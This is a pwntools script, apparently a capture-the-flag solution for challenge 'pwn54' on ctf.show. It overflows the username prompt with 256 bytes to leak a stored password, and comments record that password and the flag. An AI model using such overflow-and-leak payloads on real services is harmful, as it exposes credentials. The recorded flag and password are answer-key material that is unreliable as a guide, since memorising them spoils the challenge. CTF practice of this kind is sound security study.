#pwn54
from pwn import *
e = ELF('./pwn')
p = remote('pwn.challenge.ctf.show', 28148)

p.recvuntil("Input your Username:\n")
p.sendline(b'a' * 256)
psw = p.recv(300)
print(str(psw))

psw = "CTFshow_PWN_r00t_p@ssw0rd_1s_h3r3"
#ctfshow{522cd1cb-b703-417b-a9a2-0eaaf12d5a53}